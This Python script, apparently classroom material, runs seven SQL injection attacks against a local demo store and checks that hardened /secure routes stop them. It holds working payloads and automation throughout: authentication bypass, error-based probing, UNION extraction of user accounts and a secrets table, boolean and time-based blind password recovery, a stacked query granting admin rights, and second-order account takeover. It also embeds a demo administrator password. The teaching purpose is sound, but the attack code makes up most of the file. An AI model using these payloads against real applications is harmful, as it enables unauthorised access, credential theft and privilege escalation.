"""
attacks.py
Runs every SQL injection technique against Norbu Electronics, then fires the
same payloads at the hardened /secure routes to show they are stopped.

It uses only the requests library and talks to the store over HTTP, exactly the
way an attacker with a browser would. The store does not advertise any of these
weaknesses; the attacks find them.

Start the server first (python3 app.py), then run this (python3 attacks.py).
"""

import requests
import time
import re
import html

BASE = "http://127.0.0.1:5000"
ADMIN = "ashis.chettri"          # the administrator account (the lecturer)
ADMIN_PW = "Ch3ttri@CST!2026"


def banner(n, title):
    print()
    print("=" * 70)
    print(f"  ATTACK {n}: {title}")
    print("=" * 70)


def line():
    print("-" * 70)


def clean(t):
    return re.sub(r"\s+", " ", html.unescape(re.sub(r"<[^>]+>", " ", t))).strip()


# ---------------------------------------------------------------------------
# 1. Authentication bypass
# ---------------------------------------------------------------------------
def attack_auth_bypass():
    banner(1, "Authentication bypass (sign in)")
    payload = f"{ADMIN}'-- "
    print("Goal   : sign in as the administrator without the password")
    print(f"Payload: username = {payload!r}, password = anything")
    print("Idea   : the -- comments out the password check, so the query ends at")
    print(f"         ...WHERE username = '{ADMIN}'")
    line()

    s = requests.Session()
    r = s.post(f"{BASE}/login", data={"username": payload, "password": "x"},
               allow_redirects=True)
    got_admin = "Admin dashboard" in r.text
    print("Vulnerable /login   ->",
          "landed in the ADMIN DASHBOARD, every customer account visible"
          if got_admin else "not admin")

    s2 = requests.Session()
    r2 = s2.post(f"{BASE}/secure/login", data={"username": payload, "password": "x"},
                 allow_redirects=True)
    print("Secure /secure/login->",
          "Admin dashboard reached" if "Admin dashboard" in r2.text
          else "rejected: " + (
              "Incorrect username or password"
              if "Incorrect username" in r2.text else "no access"))

    print()
    variant = "' OR 1=1-- "
    print(f"Variant: username = {variant!r} signs in as the first user too")
    s3 = requests.Session()
    r3 = s3.post(f"{BASE}/login", data={"username": variant, "password": "x"},
                 allow_redirects=True)
    print("Vulnerable /login   ->",
          "signed in" if ("Admin dashboard" in r3.text or "Welcome back" in r3.text)
          else "no access")


# ---------------------------------------------------------------------------
# 2. Error based disclosure
# ---------------------------------------------------------------------------
def attack_error_based():
    banner(2, "Error based disclosure (sign in)")
    print("Goal   : make the database throw and read the leaked error")
    print("Payload: username = \"'\"  (one stray quote)")
    print("Idea   : the broken SQL error is shown to the user on a vulnerable")
    print("         site, which reveals the query is built by concatenation.")
    line()
    r = requests.post(f"{BASE}/login", data={"username": "'", "password": "x"})
    m = re.search(r"Database error:[^<]*", r.text)
    print("Vulnerable /login   ->", m.group(0).strip() if m else "(no leak)")
    r2 = requests.post(f"{BASE}/secure/login", data={"username": "'", "password": "x"})
    print("Secure /secure/login->",
          "Incorrect username or password (no internal detail leaked)"
          if "Incorrect" in r2.text else "generic message")


# ---------------------------------------------------------------------------
# 3. UNION based extraction
# ---------------------------------------------------------------------------
def rows_of(resp):
    out = []
    for tr in re.findall(r"<tr>(.*?)</tr>", resp.text, re.S):
        cells = [clean(c) for c in re.findall(r"<td>(.*?)</td>", tr, re.S)]
        if cells:
            out.append(cells)
    return out


def attack_union():
    banner(3, "UNION based data extraction (product listing)")
    print("Step 1 : find the column count with ORDER BY")
    line()
    for n in range(1, 7):
        r = requests.get(f"{BASE}/product", params={"id": f"1 ORDER BY {n}"})
        if "error" in r.text.lower() and "Database error" in r.text:
            print(f"  ORDER BY {n}: ERROR -> the query returns {n-1} columns")
            break
        print(f"  ORDER BY {n}: ok")

    print()
    print("Step 2 : UNION SELECT every account into those four columns")
    payload = "0 UNION SELECT username, password, role, email FROM users"
    print(f"Payload: id = {payload!r}")
    line()
    r = requests.get(f"{BASE}/product", params={"id": payload})
    print("Vulnerable /product -> stolen accounts:")
    for cells in rows_of(r):
        print("   ", " | ".join(cells))

    print()
    print("Step 3 : steal a table the store never shows (app_secrets)")
    payload2 = "0 UNION SELECT name, value, 'x', 'y' FROM app_secrets"
    print(f"Payload: id = {payload2!r}")
    line()
    r = requests.get(f"{BASE}/product", params={"id": payload2})
    for cells in rows_of(r):
        print("   ", " | ".join(cells[:2]))

    print()
    r2 = requests.get(f"{BASE}/secure/product", params={"id": payload})
    print("Secure /secure/product->",
          "Product not found (the id is validated, the payload is refused)"
          if "not found" in r2.text.lower() else clean(r2.text)[:60])


# ---------------------------------------------------------------------------
# 4. Boolean based blind
# ---------------------------------------------------------------------------
TAKEN = "already taken"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*().-"


def attack_boolean_blind():
    banner(4, "Boolean based blind (username checker)")
    print("Goal   : the checker only says 'taken' or 'available'. Recover the")
    print("         administrator password one character at a time from that bit.")
    print("Idea   : ask 'is character N of the password equal to X ?' in the WHERE.")
    line()
    recovered = ""
    for pos in range(1, 30):
        found = None
        for ch in CHARSET:
            cond = (f"{ADMIN}' AND substr((SELECT password FROM users WHERE "
                    f"username='{ADMIN}'),{pos},1)='{ch}'-- ")
            r = requests.get(f"{BASE}/check-username", params={"username": cond})
            if TAKEN in r.text:
                found = ch
                break
        if not found:
            break
        recovered += found
        print(f"  position {pos:>2}: '{found}'   recovered so far: {recovered}")
    print()
    print(f"Recovered administrator password (blind): {recovered}")

    print()
    cond = (f"{ADMIN}' AND substr((SELECT password FROM users WHERE "
            f"username='{ADMIN}'),1,1)='C'-- ")
    r = requests.get(f"{BASE}/secure/check-username", params={"username": cond})
    print("Secure /secure/check-username->",
          "always 'available', the payload is one literal username"
          if "available" in r.text else "taken")


# ---------------------------------------------------------------------------
# 5. Time based blind
# ---------------------------------------------------------------------------
def attack_time_blind():
    banner(5, "Time based blind (username checker)")
    print("Goal   : same as blind, but read the answer off the clock when there")
    print("         is no visible difference. A correct guess runs slowly.")
    heavy = ("(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL "
             "SELECT x+1 FROM c LIMIT 8000000) SELECT x FROM c))")
    line()

    def timed(ch, pos):
        cond = (f"{ADMIN}' AND (SELECT CASE WHEN (SELECT substr(password,{pos},1) "
                f"FROM users WHERE username='{ADMIN}')='{ch}' THEN {heavy} "
                f"ELSE 0 END)-- ")
        t = time.time()
        requests.get(f"{BASE}/check-username", params={"username": cond})
        return time.time() - t

    recovered = ""
    for pos in range(1, 5):
        for ch in CHARSET:
            if timed(ch, pos) > 0.4:
                recovered += ch
                print(f"  position {pos}: '{ch}' ran slowly -> TRUE")
                break
    print()
    print(f"Recovered first characters by timing only: {recovered}")
    t = time.time()
    requests.get(f"{BASE}/secure/check-username",
                 params={"username": f"{ADMIN}' AND 1=1-- "})
    print(f"Secure route responded in {time.time()-t:.2f}s (flat, no timing leak)")


# ---------------------------------------------------------------------------
# 6. Stacked queries
# ---------------------------------------------------------------------------
def role_of(username):
    for u in requests.get(f"{BASE}/debug/users").json():
        if u["username"] == username:
            return u["role"]
    return None


def attack_stacked():
    banner(6, "Stacked queries (view counter)")
    print("Goal   : append a second statement after a semicolon. Here, promote")
    print("         a normal account to administrator.")
    line()
    target = "tashi.dorji"
    print(f"{target} role before:", role_of(target))
    payload = f"1; UPDATE users SET role='admin' WHERE username='{target}'"
    print(f"Payload: id = {payload!r}")
    requests.get(f"{BASE}/track", params={"id": payload})
    after = role_of(target)
    print(f"{target} role after :", after,
          "  <-- privilege escalation" if after == "admin" else "")
    print()
    requests.get(f"{BASE}/secure/track", params={"id": payload})
    print("Secure /secure/track-> rejected the non numeric id, no change")


# ---------------------------------------------------------------------------
# 7. Second order
# ---------------------------------------------------------------------------
def pw_of(username):
    for u in requests.get(f"{BASE}/debug/users").json():
        if u["username"] == username:
            return u["password"]
    return None


def attack_second_order():
    banner(7, "Second order injection (register, then reset)")
    print("Goal   : take over the administrator account. The payload is STORED")
    print("         during registration and only fires later, during reset.")
    line()
    print("Admin password before:", pw_of(ADMIN))
    evil = f"{ADMIN}'-- "
    print(f"Step 1: register username = {evil!r} (stored safely, no error)")
    requests.post(f"{BASE}/register", data={"username": evil, "password": "x"})
    attacker = [u for u in requests.get(f"{BASE}/debug/users").json()
                if u["username"] == evil][0]
    print("Step 2: trigger a password reset as that stored account")
    reset = requests.post(f"{BASE}/reset",
                          data={"user_id": attacker["id"],
                                "new_password": "pwned_2nd_order"})
    print("        query that ran:", reset.json().get("query", ""))
    after = pw_of(ADMIN)
    print("Admin password after :", after,
          "  <-- administrator account taken over" if after != ADMIN_PW else "")


if __name__ == "__main__":
    print("Running all SQL injection attacks against", BASE)
    attack_auth_bypass()
    attack_error_based()
    attack_union()
    attack_boolean_blind()
    attack_time_blind()
    attack_stacked()
    attack_second_order()
    print()
    line()
    print("Done. Restart the server (python3 app.py) to reset the database.")
